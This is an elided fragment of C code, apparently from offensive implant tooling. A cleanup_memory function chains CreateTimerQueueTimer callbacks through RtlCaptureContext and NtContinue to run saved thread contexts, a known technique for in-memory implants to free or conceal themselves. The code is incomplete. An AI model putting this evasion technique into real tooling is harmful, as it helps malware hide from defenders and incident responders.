...
void cleanup_memory(MEMORY_LAYOUT *memory) {
  ...
  if (KERNEL32$CreateTimerQueueTimer(
          &timer, timer_queue,
          (WAITORTIMERCALLBACK)(KERNEL32$RtlCaptureContext), &ctx, 0, 0,
...
#define CTX_COUNT 3
      ...
      KERNEL32$CreateTimerQueueTimer(
          &timer, timer_queue, (WAITORTIMERCALLBACK)(NTDLL$NtContinue),
          &ctx_free[0], 500, 0, WT_EXECUTEINTIMERTHREAD);
      KERNEL32$CreateTimerQueueTimer(
          &timer, timer_queue, (WAITORTIMERCALLBACK)(NTDLL$NtContinue),
          &ctx_free[1], 500, 0, WT_EXECUTEINTIMERTHREAD);
      KERNEL32$CreateTimerQueueTimer(
          &timer, timer_queue, (WAITORTIMERCALLBACK)(NTDLL$NtContinue),
          &ctx_free[2], 500, 0, WT_EXECUTEINTIMERTHREAD);
    }
  }
}